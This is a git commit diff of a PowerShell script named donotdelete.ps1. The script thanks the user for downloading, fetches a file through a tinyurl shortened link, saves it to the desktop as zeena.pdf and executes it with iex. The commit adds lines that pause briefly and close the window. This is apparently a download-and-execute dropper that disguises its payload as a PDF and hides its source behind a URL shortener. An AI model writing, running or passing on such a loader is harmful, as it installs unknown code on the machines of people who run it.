1401850c5abf864c41fbf5d0cc9c3f9d1a185ff6
aishazyn15-ops <aishazyn15@gmail.com>
2026-02-09 19:01:41 +0500

    Update donotdelete.ps1

--- donotdelete.ps1
+++ donotdelete.ps1
@@ -1,4 +1,7 @@
 write-host "Thank you for downloading! :)" -ForegroundColor Green
 powershell iwr "https://tinyurl.com/pdf4zeena" -OutFile "$ENV:USERPROFILE\DESKTOP\zeena.pdf"
 iex "$ENV:USERPROFILE\DESKTOP\zeena.pdf"
-pause
+start-sleep -seconds 3
+write-host "This window will now close..." -ForegroundColor Green
+start-sleep -seconds 2
+exit
